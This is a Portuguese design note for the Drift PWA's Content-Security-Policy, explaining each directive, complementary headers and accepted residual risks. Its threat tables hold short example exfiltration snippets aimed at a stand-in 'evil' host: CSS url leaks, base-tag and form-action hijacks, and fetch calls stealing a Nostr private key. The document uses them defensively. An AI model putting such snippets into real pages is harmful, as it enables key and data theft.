# Content-Security-Policy — Drift PWA

**Data:** 2026-05-15
**Autor:** Ted v4 (revisão arquitetural)
**Escopo:** prod (Vercel headers em `vercel.json`)
**Status:** ativo

---

## TL;DR

CSP entregue via HTTP header em Vercel (`vercel.json`), não meta tag —
header suporta `frame-ancestors` e tem precedência consistente. Política
estrita: nenhum `'unsafe-inline'` em scripts, nenhum `'unsafe-eval'`,
nenhum `*` wildcard global em `default-src`/`script-src`.

Cada diretiva permissiva tem motivo explícito documentado abaixo.

```
default-src 'self';
script-src 'self' 'wasm-unsafe-eval';
style-src 'self' 'unsafe-inline';
img-src 'self' data: blob: https:;
connect-src 'self' wss: https:;
worker-src 'self' blob:;
font-src 'self' data:;
media-src 'self' blob:;
manifest-src 'self';
object-src 'none';
base-uri 'self';
form-action 'self';
frame-ancestors 'none';
upgrade-insecure-requests
```

---

## Diretivas — cada uma, com motivo

### `default-src 'self'`
Fallback default. Tudo que não tiver diretiva específica cai aqui:
mesma origem apenas. Defense-in-depth pra fetch types não cobertos
explicitamente (prefetch, application manifest, etc.).

### `script-src 'self' 'wasm-unsafe-eval'`
- **`'self'`** — bundles próprios (`/assets/*.js`).
- **`'wasm-unsafe-eval'`** — SQLite WASM compila/instancia módulos
  WASM em runtime (`WebAssembly.instantiate`). Esta diretiva é o
  modo correto de permitir isso **sem** abrir `'unsafe-eval'` (que
  permitiria JS `eval()` arbitrário — vetor de XSS).
- **Sem `'unsafe-inline'`**: nenhum `<script>` inline no `index.html`.
  Vite registration do SW também roda como módulo via `injectRegister:
  'auto'` → tag externa.
- **Sem `'unsafe-eval'`**: confirmado que nostr-tools, libp2p, helia
  não dependem disso. Se algum chunk lazy quebrar, preferir nonce
  ou hash específico antes de afrouxar.
- SRI (`integrity="sha384-..."`) baseline já existe em dist artifacts —
  CSP estrito + SRI = ator que compromete CDN ainda não injeta script.

### `style-src 'self' 'unsafe-inline'`
- **`'self'`** — CSS bundles.
- **`'unsafe-inline'`** — **necessário**: Tailwind via Vite injeta
  algumas regras runtime; Framer Motion seta `style="transform:..."`
  inline em cada elemento animado; React seta `style={{...}}` em
  vários componentes. Hash de cada inline style seria impraticável
  (mudaria a cada deploy).
- Risco residual: XSS injection via style (CSS exfil via
  `background:url('//evil/?'+leak)`) — endereçado por `connect-src`
  restritivo (sem wildcard `*`) e `img-src https:` (não permite
  `http:` exfil).

### `img-src 'self' data: blob: https:`
- **`'self'`** — ícones do PWA, etc.
- **`data:`** — placeholders inline (favicons, SVG inline em
  componentes).
- **`blob:`** — preview de upload local antes de enviar pro
  nostr.build; thumbnails de imagens decodificadas por Helia/IPFS.
- **`https:`** — uploads de imagem retornam CDN URLs variadas
  (`image.nostr.build`, `void.cat`, etc.). Restringir a hostnames
  específicos quebra a economia descentralizada do Nostr. Permitir
  `https:` global mantém ratchet anti-`http:` (clear-text fica
  bloqueado, força HTTPS).

### `connect-src 'self' wss: https:`
- **`'self'`** — fetch dos próprios assets.
- **`wss:`** — relays Nostr são WSS arbitrários (manifesto §28:
  compatível com ecossistema). Lista de relays é dinâmica
  (§17 do CLAUDE.md, gerenciamento via `lib/relays.ts`),
  hardcode quebraria o modelo. WebRTC signaling também via WSS.
  **Não permitimos `ws:`** — clearnet sem TLS quebra manifesto §15.
- **`https:`** — fetch de imagens nostr.build, NIP-65 discovery via
  HTTP de relay info, IPFS gateway opcional. Mesmo argumento de
  `img-src https:` — wildcard de host necessário, mas força HTTPS.

### `worker-src 'self' blob:`
- **`'self'`** — `db.worker.ts` (SQLite worker) e SW.
- **`blob:`** — Vite em alguns build outputs registra workers via
  `new Worker(URL.createObjectURL(blob))` (formato ES module).
  Necessário pra SQLite WASM no esquema atual.

### `font-src 'self' data:`
- **`'self'`** — Tailwind/sistema. Atualmente Drift não carrega
  webfonts externas.
- **`data:`** — algumas libs de mapa (MapLibre) embedam glyphs SDF
  como data URLs em alguns paths.

### `media-src 'self' blob:`
- Atualmente Drift não renderiza `<audio>`/`<video>`. Diretiva
  presente como **defesa explícita** (sem fallback pra `default-src`)
  e prep pra features futuras (atachamento de vídeo, voice notes —
  ainda não no roadmap). `blob:` cobre preview local.

### `manifest-src 'self'`
- `/manifest.webmanifest` é mesmo origin.

### `object-src 'none'`
- Bloqueia `<embed>`, `<object>`, `<applet>` — vetores de XSS
  Flash-era ainda exploráveis em browsers legacy.

### `base-uri 'self'`
- Anti `<base href="//evil/">` injection: ator com XSS limitado a
  inject de markup sem JS ainda poderia redirecionar todos os links
  relativos do app. Bloqueado.

### `form-action 'self'`
- Drift não faz form POST cross-origin. Bloqueia exfil via
  `<form action="//evil/">`.

### `frame-ancestors 'none'`
- Anti-clickjacking. Drift nunca deve ser embedded em iframe de
  terceiro. Combinado com header `X-Frame-Options: DENY` (legacy
  browsers). `frame-ancestors` é a versão moderna; só funciona via
  HEADER (não meta tag) — por isso CSP vive em `vercel.json`, não
  no `index.html`.

### `upgrade-insecure-requests`
- Browser promove automaticamente qualquer `http://` resource pra
  `https://`. Defesa contra mixed content; especialmente útil pra
  URLs de imagem em posts antigos que possam ter sido publicadas
  pré-HTTPS-everywhere.

---

## Headers complementares (já existentes em `vercel.json`)

- `Cross-Origin-Opener-Policy: same-origin` — pré-requisito de
  `crossOriginIsolated` (SQLite WASM + SharedArrayBuffer).
- `Cross-Origin-Embedder-Policy: credentialless` — variante mais
  leniente de `require-corp` que aceita imagens cross-origin sem
  CORP header (necessário pra `image.nostr.build`).
- `X-Content-Type-Options: nosniff` — bloqueia MIME sniffing.
- `X-Frame-Options: DENY` — legacy backup do `frame-ancestors`.
- `Referrer-Policy: no-referrer` — manifesto §4 (anonimato). Saída
  pra qualquer URL externa não vaza qual post o user estava vendo.
- `Permissions-Policy: geolocation=(self), camera=(), microphone=(),
  payment=()` — geo opt-in (manifesto §27 / location off-default);
  camera/mic/payment bloqueados (não usamos).

---

## Riscos endereçados

| Vetor | Bloqueado por |
|---|---|
| XSS inline (`<script>alert(1)</script>`) | `script-src 'self'` (sem `unsafe-inline`) |
| XSS via `eval`/`new Function` | sem `'unsafe-eval'` (só `wasm-unsafe-eval`) |
| Exfil de nsec via `fetch('//evil/...')` | `connect-src 'self' wss: https:` força HTTPS; XSS ainda poderia exfilar pra `https://evil.com`, mas requeria XSS prévio (que `script-src 'self'` bloqueia) |
| Clickjacking (Drift em iframe malicioso) | `frame-ancestors 'none'` + `X-Frame-Options: DENY` |
| Base tag hijack | `base-uri 'self'` |
| Form exfil | `form-action 'self'` |
| Mixed content downgrade | `upgrade-insecure-requests` |
| Flash/Object XSS legacy | `object-src 'none'` |
| MIME sniffing | `X-Content-Type-Options: nosniff` |
| Referer leak | `Referrer-Policy: no-referrer` |

---

## Riscos residuais — aceitos com motivo

1. **`style-src 'unsafe-inline'`** — Tailwind+Framer requerem.
   Mitigação: XSS que injete `<style>` ainda precisa contornar
   `script-src` pra fazer dano real. Exfil via CSS é teórico mas
   `connect-src` sem wildcard de host limita destino.

2. **`connect-src wss: https:` (wildcard de scheme)** — necessário
   por design (relays Nostr são abertos). Não tem como evitar sem
   quebrar manifesto §28. Mitigação: cliente nunca envia nsec por
   essas conexões (manifesto §8); todo evento Nostr é assinado
   localmente sem material de chave saindo.

3. **`img-src https:` (wildcard de host)** — uploads Nostr usam
   hosts variados. Mitigação: `upgrade-insecure-requests` força
   HTTPS; XSS limitado a `<img>` apenas exfila via 1x1 GET (sem
   POST/headers customizados).

4. **`worker-src blob:`** — necessário pro pipeline atual do Vite.
   Mitigação: blob workers herdam mesmo CSP do parent (mesma
   política); ator que conseguisse injetar blob worker já teria
   XSS exec privileges.

5. **Sem `report-uri`/`report-to`** — Drift é anti-telemetria
   (manifesto §4). Violations só visíveis em DevTools do user.
   Trade-off aceito.

---

## Dev server (Vite)

`vite.config.ts` define apenas COOP/COEP em dev (sem CSP). HMR
precisa de inline scripts e eval — adicionar CSP estrito ao dev
server quebra reload. Em dev o vetor de ataque é insignificante
(localhost, dev only).

Se algum dia for necessário: adicionar `server.headers['Content-
Security-Policy']` com `'unsafe-inline'` + `'unsafe-eval'` (apenas
dev). **Não fazer agora** — overhead sem ganho.

---

## Testing matrix

Manual verification after each change:
1. `npm run build && npx serve dist` (com Vercel-like headers via
   `serve.json`)
2. Abrir DevTools console; navegar boot completo:
   - Identity load (SQLite WASM)
   - Feed render (Nostr WSS subscribe)
   - Upload imagem (https://image.nostr.build)
   - Settings → Pin (Helia, se habilitado)
   - Mapa (Fase 4) — MapLibre + CARTO tiles
3. Console deve estar limpo de `Refused to ...` violations.
4. Se houver, ajuste a diretiva mínima — documente aqui.

---

## Changelog

- **2026-05-15** — Adicionado `media-src 'self' blob:`,
  `upgrade-insecure-requests`. Baseline anterior já cobria 11 das
  13 diretivas; gap era media e upgrade. Documento criado.
